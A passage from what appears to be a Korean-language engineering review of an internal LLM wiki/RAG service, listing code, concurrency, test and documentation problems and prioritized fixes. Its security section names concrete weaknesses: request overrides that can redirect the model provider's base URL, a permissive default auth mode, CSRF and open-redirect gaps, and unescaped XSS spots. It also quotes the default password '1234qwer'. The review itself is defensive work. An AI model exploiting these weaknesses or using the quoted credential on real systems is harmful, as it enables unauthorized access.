| 3 | **BRINGUP 의 실행 불가능한 예시**: §3.2/§8 스케줄 `when{}`·`on_error`·`max_runtime_s`·`catch_up` (코드는 최상위 `every\|at\|cron`·`timeout_s`·`overlap`); §9 `server stats\|activity\|unblock\|--server` (실제 `status\|requests\|block\|--url`); §4.4 `users passwd kh82.kim` 은 신규 환경(빈 users)에서 실패 — **첫 admin 생성 절차가 없다**; `db_pool_size` "0=스레드마다" (기본 16); RERUN.md `--claim-support-min` 플래그 부재 |
| 4 | **CLI_FLOWS 커버리지 공백**: `rerun`·`optimize`·`schedule`(10 액션)·`server`·`mcp --doctor`·`rules lint\|merge`·`models list\|catalog\|discover\|policy`·`precompute check`·`prune_requests` 가 "전 명령" 카탈로그에 없음; 종료 코드 4·5 누락; 경로 레지스트리 14종(코드 18) |
| 5 | **세션 기록 22개가 참조 문서와 동급 배치**(docs 39개 중 살아 있는 참조 17개) — 검증 수치가 회차마다 달라 "지금 값" 을 알 수 없음; HANDOVER 는 완료됐으나 첫 화면 |
| 6 | **자동 생성 문서를 특정 환경 값과 함께 커밋**: TUNING.md "현재" 열에 로컬 오버라이드(`embed_dim 256`), OPTIMIZATION_GUIDE 는 토글 59·`context_neighbors` 중복 행·§8 누락 |
| 7 | REBUILD_SPEC 제목 "이 문서만으로 동일 동작 재구현" 이 v2 사양(토글 26·MCP 4종) — 경고가 README 표 한 줄뿐; `legacy/ARCHITECTURE.md`·`DESIGN_REVIEW.md` 의 링크 2건 **끊김** |
| 8 | **bring-up 절차 공백**: 첫 admin 생성 · `serve` 상주(systemd/NSSM/작업 스케줄러) · 리버스 프록시·HTTPS 예시 · 포트/방화벽 표(8765/8766/8792~8799 산재) · `.env` 키 총람 · 사내 CA/`HTTPS_PROXY` · 업그레이드/롤백 절차 · Linux 파일 권한 |
| 9 | 용어 드리프트: "관측"/"Observability"/"Requests 탭", "Web 관리 › 서버 모니터"(UI 에 "관리" 그룹 없음), "보안 탭"/"Settings › 보안"; `bat`(`::`)/`powershell`(`#`)/`bash` 코드 블록 혼용 |
| 10 | 파일 위생: `docs/user-req.0913.,txt`(쉼표 파일명, md 와 중복), `security.json.bak`, `setup/__pycache__`, PLAN.md·plugins README·sample_corpus README 가 README 에서 링크되지 않음, `tools/verify/README` 가 8개만 나열(실제 21개), `setup/sample_corpus/README` 의 install.bat 설명이 현행과 다름 |

---

## 3. 횡단 관찰

### 3.1 "설정 외부화" 원칙의 실제 준수도

원칙은 강하게 세워져 있고 큰 손잡이는 전부 파일에 있다. 그러나 **코드 안에 남은 상수가 아직 100개 이상**이다. 대표적으로:

| 종류 | 예 |
|---|---|
| 도메인 값(이식 시 반드시 바꿔야 하는데 코드에) | 문서 ID 접두 정규식 3중복(`answer/evidence`), `DEFAULT_RULES` 반도체·증권 사전, `DEFAULT_QUESTIONS` HBM4, Ask 탭 `SAMPLES` "ISSUE-2001", `EXCLUDE_DIRS`·`.claude`, 관계 이름 |
| 운영 수치 | 빌드 락 6h, `_FED_CACHE` TTL 300, 임베더 배치 64/32·타임아웃 120/600, rerank timeout 120, HTTP 재시도 sleep 1.5×n, 무차별 대입 0.5s, 잡 보관 50, 폴링 2000/500/700/1000ms, 스케줄 이력 200/100, `_KEEP_DONE_S`, `MAX_BYTES/MAX_USERS`(profiles) |
| 알고리즘 상수(tuning.json 대상) | 융합 `/50.0`·`0.3`·`router_type 1.2`·`recency 0.3`, 그래프 `5.0+len*0.2`·`0.5`·`1/(i+1)+0.2`, forensic 9종, analysis 렌즈 임계 6종, 조사·불용어 목록, 상한 `[:6]`·`[:3]`·`[:4]` |

### 3.2 코드 구조

- 거대 함수: `cli._run_cmd` 792줄, `server._do_get` 419줄, `query_engine.run` 401줄, `pipeline.report`(중첩) 357줄, `server._dispatch_post` 340줄, `scheduler.run_action` 244줄, `mcp.call_tool` 214줄, `forensic.suggest` 209줄. 이미 `_cmd_server/_cmd_schedule` 처럼 분리한 패턴이 있으니 그 방향으로 계속 쪼개면 된다.
- 죽은 코드: `pipeline._query_legacy`(148줄)·`retrieval.rrf_fuse`, `analysis.plan_pins`·`LLM_STAGES`, `core.js [data-clear]`, `corpus.js extAuto`, `cli.py schedule run` 의 no-op 컨텍스트, `logging_setup.setup_from_settings` 의 존재하지 않는 `s.log_dir`.
- 중복: 설정 저장/복원 3벌, `_build`/`_build_channel` finally 60줄, MODEL_CATALOG 2원천(`providers` vs `models_catalog`), 스냅샷 2구현(`snapshots.py` vs `evolve._snapshot`), 프롬프트 2원천(`prompts.py DEFAULTS` vs `prompts/*.md`), 격리 env 3벌(`verify_*`), 픽스처 7벌(`tests`), 질문셋 2곳.
- 요청 범위 밖 전역 상태 변경: `build(channels=)`·`precompute.run`·`eval --matrix`·`query --analyze`·`forensic.trace_expectation`(pipe=None 경로)·`providers.live_test`.

### 3.3 동시성 모델의 남은 구멍

요청 격리(`request_scope`)와 요청 관리자는 잘 만들어졌지만, 그 **바깥** 에 프로세스 전역이 남아 있다: `sys.stdout`(콘솔), `_PLUGIN_TOOLS`/`_FED_CACHE`/`_OLLAMA_PROBE`/`COMPOUNDS`(무락 dict), `_JOBS`(부분 락), 공유 프로바이더 인스턴스 필드, pins/prompts/wiki/board 파일(비원자), `RotatingFileHandler`(다중 프로세스). 각각 "드물게" 터지는 종류라 스트레스 테스트를 통과했어도 30명 운영에서는 나타난다.

### 3.4 문서 체계

문서량과 깊이는 이례적으로 높지만 **"같은 사실이 네 곳에 산다"** — 기능·설정 키 요약이 README §2/§3, BRINGUP §3.2, ARCH_V3 §7, IMPL_PLAN §8 에 각기 다른 시점의 값으로 존재한다. `verify_docs.py` 가 명령 이름·토글·링크는 잡지만 **숫자("N개")·2단 서브커맨드·스케줄 JSON 예시·동시성 서술** 은 잡지 못해 낡음이 누적됐다.

---

## 4. 개선 제안 (무엇 / 왜 / 어디)

### 4.1 보안 (P0)

1. **오버라이드 화이트리스트** — `apply_overrides` 앞단에서 요청 단위 허용 키를 `Toggles` + `{top_k_*, debug_level, *_model, *_provider, *_effort, llm_roles 의 model/effort}` 로 제한. URL·헤더·경로 계열(`*_base_url`, `*_url`, `openai_extra_headers`, `corpus_dirs`, `data_dir`, `wiki_dir`, `mcp_plugins_dir`)은 `admin` 등급 + `/api/models/test` 에서만. 목록은 `security.json overrides.allow` 로 외부화, SECURITY.md 에 표. (`config.py`, `server.py:1265`)
2. **자격증명 정리** — 루트 `security.json` 을 예제(users 비어 있음)로 교체, `.bak`·테스트 계정·`op0~7`·API 키 삭제, README/INSTALL/BRINGUP 의 `1234qwer` 제거, `.gitignore` 에 `security.json*`, `server.json`, `data/.session_secret`, `data/sessions.json`, `data/profiles.json`, `tools/verify/*_result.json`, `*.png`, `__pycache__` 추가. `health` 에 "기본 admin 잔존 / mode auto + 공개 바인드 / security.json 파싱 가능" 검사 추가(`check_env.py:92` 로직 재사용). BRINGUP §4.4 첫 줄에 **첫 admin 생성 절차**.
3. **`mode` 기본값** — `DEFAULT_SECURITY.mode = "on"`, 또는 `sso.type=header` 나 `trusted_proxies` 가 있으면 auto→on 강제. `server.json access.trusted_proxies`(CIDR, `ipaddress` 모듈) + `X-Forwarded-For` 해석을 `_ip()` 에 넣고 `auth.user_from_headers` 도 같은 목록 사용. `X-Forwarded-Proto` 는 trusted proxy 에서 온 것만 신뢰.
4. **오류·노출 정책** — `_server_error()` 헬퍼: 로그에 기록, 클라이언트에는 `{"error","code":"internal","ref":run_id}`; 트레이스는 `server.json debug.expose_trace`(기본 false) 또는 admin 만. GET 등급표에 `/api/logs*`, `/api/schedule`, `/api/mcp_sources`, `/api/agents`, `/api/config/effective`, `/api/models`, `/api/admin/*` 를 admin 으로; `/api/status` 는 `settings/paths` 를 admin 에게만; `/api/queries`·`/api/query_trace` 에 `requests all` 검사. `_body()` 는 JSON 오류를 400 으로. 보안 헤더 공통 헬퍼(nosniff·DENY·Referrer-Policy·CSP) + 정적 ETag/`Cache-Control`(`server.json static.cache_s`). `_safe_join` 헬퍼를 wiki/logs/static 에 공통 적용. 로그인 티켓 `weight="none"`.
5. **MCP 방어** — `handle()` 첫머리에서 `jsonrpc/params/id` 형 검사(-32600/-32602), `serve_stdio`·`handle_http` 의 `handle` 호출을 try 로(-32603); `_subst` 는 `${ENV}` 를 **먼저** 평가하고 사용자 값을 나중에; `expose:true` 도 캐시된 tools/list 이름 집합(REST 는 `cfg.tools`)만 통과, REST `name` 은 `^[A-Za-z0-9_.-]+$`; 플러그인·원격 `annotations` 보존; stdio 클라이언트는 리더 스레드 + `queue.get(timeout)` + stderr 배출 스레드; `Accept: application/json, text/event-stream` + SSE 응답 파싱 + `MCP-Protocol-Version` 헤더. 설정 키: `server.json mcp.{fed_cache_ttl_s, fed_list_timeout_s, source_timeout_s_default, bridge_timeout_s, max_k, max_doc_chars, instructions}`; `mcp_sources.json` 저장 시 `sys.executable` 대신 `{python}`.
6. **인증 강화** — `security.json local.lockout {attempts, window_s, lock_s}`; 로그아웃 시 `enforce` 와 무관하게 sid 거부 목록; OIDC PKCE(S256, `hashlib/secrets` 로 충분)·nonce 필수·`allowed_domains` 는 email 없으면 거부; CSRF Origin 은 포트 포함 비교·localhost 예외 제거; 리다이렉트 `//` 차단. headless: `agents.json env_passthrough` 허용 목록, `prompt_mode` 기본 `stdin`, 로그 argv 프롬프트 마스킹.

### 4.2 데이터·운영 무결성 (P1)

7. **테스트 격리 수정** — `test_concurrency_0915.py:1304` 의 `LLMWIKI_SECURITY` → `LLMWIKI_SECURITY_PATH`; `config.path_for` 가 알 수 없는 `LLMWIKI_<NAME>` 변수를 보면 경고; 모든 테스트가 `tests/helpers.isolated()` 컨텍스트로 전 경로를 tmp 로. `test_console_0915` 도 격리.
8. **콘솔 캡처 격리** — `_run_cmd` 에 `out=` 스트림(또는 `contextvars` 기반 `_print`)을 넘기고 `_CAPTURED` 를 컨텍스트 변수로. 당장은 `/api/cli` + 스케줄 `cli` 를 하나의 `Lock` 으로 직렬화하는 최소 수정도 가능(CONCURRENCY.md 에 명시).
9. **자가진화 안전화** — `capture_query` 는 제안만 만들고 자동 적용은 스케줄 `evolve auto_apply`(exclusive 티켓)로만; `apply_proposal` 에 `check_cancel`; 회귀 판정에 `evolve_regression_tolerance`(0.02)·`evolve_eval_repeats`(2)(config.json) 로 평균 비교; kind 별 payload 스키마 검증을 **등록 시점**으로; `evolve._snapshot/_restore` 를 `snapshots.create/restore(tag=…)` 로 통합하고 `destructive.snapshot_keep` 적용; `snapshots.py` 에 query_rules/pins/tuning/prompts/schemas 포함.
10. **빌드 락** — 백그라운드 `touch()` 하트비트 + `build_lock_stale_s`(config.json); `_pid_alive` 는 ACCESS_DENIED 시 True; `holder()` 파싱 실패 시 mtime 기준. 빌드 실패 시에도 `build_version` 증가(또는 `build_dirty` kv) 로 캐시 무효화. `build(channels=)`·`precompute.run` 은 `request_scope` 사본만 변경.
11. **FTS N² 제거** — `entities_fts`/`chunks_fts` 의 rowid 를 원본 테이블 rowid 와 동일하게 INSERT 하고 `DELETE … WHERE rowid IN (SELECT rowid FROM … WHERE …)` 로 삭제. `build fts`/`build graph` 재실행으로 마이그레이션.
12. **CLI 게이트** — `_strip_global` 이 `build_parser()` 의 전역 옵션 목록을 자동으로 건너뛰게; `classify_cli` 표에 `schedule add/remove/enable/disable → admin`, `schedule list/show/history/validate → read`, `rerun/optimize/analyze → read`, `server status/requests → read, 그 외 admin`; 스케줄 실행은 `task.run_as_role`(기본 builder) 로 `classify_cli` 통과.
13. **스케줄러** — `overlap: skip|queue|allow` 구현(또는 `validate_task` 가 skip 외 거부); `catch_up`·`misfire_grace_s`; `_tz` 실패 시 경고를 `errors`·`health` 에; 기동 시 `running` 잔재를 `interrupted` 로 기록; CLI `schedule run` 은 `persist=False`.
14. **요청 관리자** — 대기 티켓 `seq` 로 FIFO 슬롯; `_rate`/`clients` 에 `monitor.client_ttl_min` 정리; `writers_waiting` 을 `{exclusive, soft}` 로 분리; `release_write` 소유자 검사. `_JOBS` 변경도 락 아래, `/api/status.jobs` 는 요약만.
15. **프로바이더** — `llm_budget_s` 기본값(예 900), `llm_http_retry_backoff_s` 설정화, 내부 sleep 을 `sleep_cancellable` 로, 409 non-transient; `anthropic_extra_headers`; 임베더 공통 `_post`(재시도·타임아웃·`embed_batch`); `live_test` 는 인스턴스 복제; `_files` 는 `complete()` 인자로; `MODEL_CATALOG` 일원화; mock 에 `TASK=verify/route` JSON 분기. 로그는 프로세스별 파일명 또는 서버만 로테이션, `audit.jsonl` 에 `log_max_mb` 적용.
16. **검색 품질** — `infer.json` glob 을 경로 세그먼트 완전일치(`*/cls/*`)로, `corpus lint` 에 "추론 유형 분포" 경고; 별칭 정규식에 영숫자 경계(query_rules 와 동일 규칙); 조사 제거를 2음절 이상 + `tuning.json josa_single_strip` on/off, 조사·불용어를 `query_rules.json` 에 `josa/stopwords` 절로; 16진수 토큰 패턴; bigram 은 `tokenchars '_'` 또는 별도 컬럼(재색인 안내 문서화); query_rules 정규식 사전 컴파일; `entity_index` 에 `deg`·`name→id` 포함; pins/prompts/wiki 를 atomicio 로; `lint_document` try 보호; `_split_long` 에서 `overlap=min(overlap, max//2)`; `vector_matrix` 는 임베더 dim 기준.
17. **프론트** — `api()` 가 `{ok:false,…}` 명시 반환 + `apiList()`(오류면 `[]`), `pollJob` 은 id 없으면 즉시 반환, `AbortSignal.timeout`; 폴링 주기·백그라운드 정지 정책을 `server.json ui.poll_ms` 로 내려 세 모듈이 공유; 역할/로그파일/limits help/스케줄 샘플/예시 질문을 서버가 내려주도록(`SAMPLES` 는 `config.json ui.sample_queries` 또는 `eval/questions.json` 상위 N); XSS 12곳 `esc`; `confirm()/prompt()` 16곳을 `LW.ask` 모달로; collab `document.hidden` 존중·삭제 1회 호출.

### 4.3 코드 구조 (P2)

18. `cli._run_cmd` → `COMMANDS = {"build": _cmd_build, …}` 표 + `EXIT = {usage:1, locked:2, health:3, cancelled:4, denied:5}` 상수(CLI_FLOWS §5.1 연결). `server.py` 라우팅 표 + `routes_get.py/routes_post.py`. `pipeline` 빌드 오케스트레이션 분리. `query_engine` 단계 객체화 + replay 래퍼. 설정 저장/복원 3벌 → `request_scope` 하나. 죽은 코드 삭제(§3.2 목록). 하드코딩 상수(§3.1) 를 config/tuning/server 키로 옮기고 `setup/*.example` + BRINGUP §3.2 표 동시 갱신.
19. `setup/config.example.json` 을 `Settings()` 기본값에서 생성하는 `config example --write` 명령(또는 테스트)로 드리프트 방지; Python 최소 버전 3.9 로 단일화; `__version__` 을 `--version`·`/api/status`·MCP `serverInfo` 에 노출.

### 4.4 테스트·CI (P1~P2)

20. **git 초기화 + CI** — `.github/workflows/test.yml`(또는 사내 GitLab): matrix `[3.9, 3.12]`(3.7 은 포기하고 문서 정정), 단계 1 = `python -W error::ResourceWarning -m unittest discover -s tests` + `verify_docs/surface_align/ui_wiring`; nightly = `verify_all --quick`. Linux 용 `run.sh test`.
21. **재구성** — `tests/unit/test_<module>.py`(1:1) · `tests/integration/` · `tests/stress/`(`LLMWIKI_TEST_FAST=1` 이면 skip); 공용 픽스처 `tests/helpers.py`; 샘플 코퍼스 빌드를 `setUpClass`/모듈 1회로(목표 <40초); `query_engine/evidence/graph_build/store/server` 직접 단위 테스트 추가; 시간 단언은 `LLMWIKI_MOCK_DELAY_MS` 훅과 이벤트 동기화로.
22. **하네스** — `tools/verify/_env.py` 하나로 격리 env 통합, 포트 0 + 자유 포트 탐색, `verify_web` 은 격리 env 에서 `users add` 로 admin 생성(자격증명 하드코딩 제거), 결과 JSON/PNG 는 `tools/verify/results/`(gitignore), 문서 표 갱신은 `--update-docs` 명시 플래그일 때만; monkey 는 "drain 후 N초 내 정상 질의 복귀" 를 fatal 조건에, activity 0 인데 queue_full 은 결함으로 기록; 브라우저 없음은 SKIP 으로 표시.

### 4.5 문서 (P1)

23. **폴더 재구성**(이동만으로 시작) — `docs/bringup/`(BRINGUP·SECURITY·MCP·RAG_FEDERATION·CONCURRENCY·SCHEDULER·CORPUS_CONTRACT·VERIFY) · `docs/reference/`(ARCHITECTURE·CLI_FLOWS·WEB_UI·TUNING·OPTIMIZATION_GUIDE·FORENSIC·ANALYSIS_MODE·RERUN·ACTIVITY_DETAIL·REQUEST_HISTORY·COLLAB) · `docs/decisions/`(IMPLEMENTATION_PLAN_*·ANALYSIS_REPORT·requirement) · `docs/history/`(VERIFICATION_*·HANDOVER·QUALITY_REVIEW·이 문서·PLAN) · `docs/archive/v2/`(ARCH_V2·REBUILD_SPEC·BRIEF·TRENDS·legacy, 머리에 "v2 사양 — 현행과 다름" 배너). `user-req.0913.,txt` 삭제.
24. **핵심 3문서 갱신** — ARCH_V3 §5 본표에 `doc_expand/external_rag/external_inject/재생`, §8 을 요청 관리자 기준으로, §7 도구 목록은 MCP.md 링크(수를 적지 않음); CLI_FLOWS §2 에 누락 10개 명령, §5.1 종료 코드 4·5; SECURITY §3/§9 를 server.json 기준으로; MCP.md §1.2/§5·BRINGUP §4.6 의 "전역 락" 문장 제거.
25. **BRINGUP 추가 절** — §0 을 "신규 설치 / 색인 이식 / 서버 공개" 세 경로로 번호 재부여; §4.0 `.env` 키 총람; §4.4 첫 admin 생성; §4.7 리버스 프록시·HTTPS 예시(nginx/IIS); §8.1 `serve` 상주(systemd·NSSM·작업 스케줄러); §1.1 포트·방화벽 표; §11.1 업그레이드·롤백; §4.1 사내 CA·프록시 환경변수. QUALITY_REVIEW §1.2/§1.4 를 §7 "품질 레버 순서" 로 승격.
26. **낡음 방지 자동화** — `verify_docs.py` 에 (a) "N개" 숫자 대조, (b) 2단 서브커맨드 대조, (c) 스케줄 JSON 예시 블록을 `validate_task` 로 검증, (d) docs 밖 README 도달성; TUNING/OPTIMIZATION_GUIDE 는 기본값만으로 생성하고 `verify_all` 이 재생성해 diff 면 실패; README §7 "현재 상태" 를 `verify_all_result.json` 기반 한 표로; ARCH_V3 §0 에 용어 표(관측=Observability 등).

---

## 5. 이번 회차에서 직접 검증한 것

| 확인 | 방법 | 결과 |
|---|---|---|
| 단위 테스트 | `python -m unittest discover -s tests -v` | 240/240 OK, 104.6s, ResourceWarning 423 |
| 환경 | `python -m llmwiki health` | OK(fail 0 · warn 6): 자기 소스 색인 80개(23%), hash 임베딩, `llama3.1` not in list ×4 |
| P0-1 | `config.apply_overrides` 전 필드 허용 + `pipeline.PROVIDER_SIG_KEYS` 에 `openai_base_url` + `/api/query` read 등급 | 성립 |
| P1-6 | `tests/test_concurrency_0915.py:1304` 의 env 이름 vs `config.path_for` 별칭 표 | `LLMWIKI_SECURITY` 는 인식되지 않음 → 실제 파일에 기록 (현재 `security.json` 의 `op0~op7` 이 그 흔적) |
| P1-10 | `store.py:40` 스키마 + `:884,719` DELETE | `entity_id UNINDEXED` 확인 |
| P1-9 | `buildlock.py:48,67` | `stale_after_s=6*3600` 고정, `ts` 갱신 코드 없음 |
| 죽은 코드 | `_query_legacy` 호출처 grep | 정의만 존재 |
| 문서 수치 | 도구 수 grep | README 12/11/9, CLI_FLOWS 9, RAG_FED 12, 코드 14 |
| 저장소 | `data/` 크기 | DB 503MB(청크 16,896 × 4096차원 float32 ≈ 277MB 가 hash 임베딩), logs 67MB, requests 197개 |

---

## 6. 우선순위 · 예상 규모

| 순위 | 묶음 | 항목(§4) | 규모 | 언제 |
|---|---|---|---|---|
| P0 | 서버 공개 전 보안 | 1·2·3·4·5·6 | 3~5일 | **사내 서버로 열기 전** |
| P1 | 무결성·운영 | 7·8·9·10·11·12·13·14·15 | 5~8일 | 첫 운영 2주 안 |
| P1 | 문서 정합 | 23·24·25·26 | 2~3일 | P0 와 병행(다른 LLM 이 bring-up 하려면 필수) |
| P1 | CI·테스트 격리 | 20·22 | 1~2일 | P0 직후(이후 모든 수정의 안전망) |
| P2 | 검색 품질·프론트 | 16·17 | 3~5일 | 운영 데이터로 측정하며 |
| P2 | 구조 리팩터링 | 18·19·21 | 5~10일 | 기능 추가 없는 주에 |

각 묶음의 구현 계획은 `docs/IMPLEMENTATION_PLAN_<date>.md` 에 대안·근거와 함께 적고, 새 설정 키는 `setup/*.example.*` 과 BRINGUP §3.2 표에 동시에 넣는다(사용자 표준 규칙).
